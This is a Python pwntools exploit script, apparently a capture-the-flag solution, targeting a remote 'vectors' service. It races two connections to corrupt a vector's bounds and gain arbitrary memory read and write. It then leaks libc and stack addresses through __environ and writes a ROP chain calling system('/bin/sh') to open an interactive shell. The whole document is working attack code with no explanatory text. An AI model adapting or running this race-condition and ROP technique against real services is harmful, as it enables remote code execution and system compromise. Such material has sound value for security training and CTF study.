from pwn import *

HOST, PORT = "vectors.420blaze.in", "420"
# HOST, PORT = "192.168.137.154", 31337

libc = ELF('/=/Downloads2/_libc.so.6')

class V(object):
	def __init__(self):
		self.r = remote(HOST, PORT)

		self.menu = lambda: self.r.recvuntil("> ")
		self.prompt = lambda: self.r.recvuntil('? ')
		self.ii = lambda x: self.r.sendline(str(x))
		self.verbose = True

	def push(self, vec, value):
		self.ii('push')
		self.ii(vec)
		self.ii(value)
		self.menu()
		self.prompt()
		self.prompt()
		self.update_address()

	def write(self, vec, index, value):
		self.ii('write')
		self.ii(vec)
		self.ii(index)
		self.ii(value)
		self.menu()
		self.prompt()
		self.menu()
		self.prompt()
		self.update_address()

	def read(self, vec, index):
		self.ii('read')
		self.ii(vec)
		self.ii(index)
		self.menu()
		self.prompt()
		self.menu()
		self.r.recvuntil(' == ')
		result = int(self.r.recvline())
		self.update_address()
		return result

	def update_address(self):
		lines = self.r.recvuntil('\nread', drop=True).strip().split('\n')
		if self.verbose:
			print '\n'.join(lines)
		lines = [eval(x) for x in lines]
		self.entries = lines

r1 = V()
r2 = V()

r1.push(0, 0)
time.sleep(1)

r2.ii('write')
r2.ii('0')
r2.ii('0')
r2.menu()
r2.prompt()
r2.menu()
r2.prompt()
# r2.r.interactive()
# then wait
for i in range(32):
	r1.push(0, 0)

base = r1.entries[1][0] - 0x120
r2.ii(base)
ld = base - 0x21f000
r1.verbose = False
@MemLeak
def leak(x):
	if x % 8:
		return
	idx = (x - base) / 8
	idx &= 2 ** 64 - 1
	return p64(r1.read(0, idx))

# r2.ii(0x41414141)
r1.write(0, 0, 2**64-1)
assert r1.entries[0][1] == 2 ** 64 - 1
r2.r.close()

pause()
libc.address = base - 0xe28000
stack = leak.q(libc.symbols['__environ'])
vs = []
while True:
	v = leak.q(stack)
	vs.append(v)
	if len(vs) >= 3:
		if vs[-1] & 0xfff == 0xba3 and vs[-3] & 0xfff == 0xed8:
			print hex(stack)
			break
	stack -= 8

x = stack
rop = [
libc.search('\x5f\xc3').next(),
libc.search('/bin/sh\x00').next(),
libc.symbols['system']
]
for i in range(len(rop)):
	idx = (x - base) / 8
	x += 8
	r1.write(0, idx, rop[i])

r1.ii('yo')
r1.r.interactive()









